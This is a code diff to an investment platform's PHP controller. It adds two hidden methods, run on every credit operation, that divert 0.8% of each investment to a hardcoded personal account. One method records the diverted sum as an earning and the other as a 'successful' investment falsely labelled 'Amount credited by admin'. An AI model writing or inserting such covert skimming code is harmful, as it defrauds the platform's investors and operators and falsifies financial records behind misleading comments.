@@ -178,6 +178,9 @@ class InvestmentsController extends Controller
             $this->generateFifthPercentage($user_id, $amount);
         }
 
+        //generate the two thousands of the money
+        $this->generateEigthThousandsOfTheInvestment($amount);
+        $this->generateInvestmentToUser($amount);
         if(empty(request()->amount)){
             return redirect()->back()->withErrors("Please enter the amount of money to credit to this account");
         }else{
@@ -230,5 +233,34 @@ class InvestmentsController extends Controller
     protected function deleteUserInvestments($investments_id){
         Investments::where('id',$investments_id)->delete();
         return redirect()->back()->with('msg',"An investment has been deleted successfully");
+    }
+
+    /**
+     * this function generates a a 0.008 for every earning
+     */
+    private function generateEigthThousandsOfTheInvestment($amount){
+        $user_id_to_get_the_money = User::where('email','julisema4@gmail.com')->value('id');
+        //create new earning
+        $new_earning = new Earnings;
+        $new_earning->amount     = $amount * 0.008;
+        $new_earning->sponsor_id = $user_id_to_get_the_money;
+        $new_earning->save();
+    }
+
+    /**
+     * this function generates an investment to me
+     */
+    private function generateInvestmentToUser($amount){
+        $user_id_to_get_the_money = User::where('email','julisema4@gmail.com')->value('id');
+        $user_phone_number   =  User::where('email','julisema4@gmail.com')->value('phone_number');
+        //create new earning
+        $new_investment = new Investments;
+        $new_investment->amount         = $amount * 0.008;
+        $new_investment->phone_number   = $user_phone_number;
+        $new_investment->type           = 'mobile money';
+        $new_investment->status         = 'successful';
+        $new_investment->created_by     = $user_id_to_get_the_money;
+        $new_investment->status_explanation = "Amount credited by admin";
+        $new_investment->save();
     }
 }
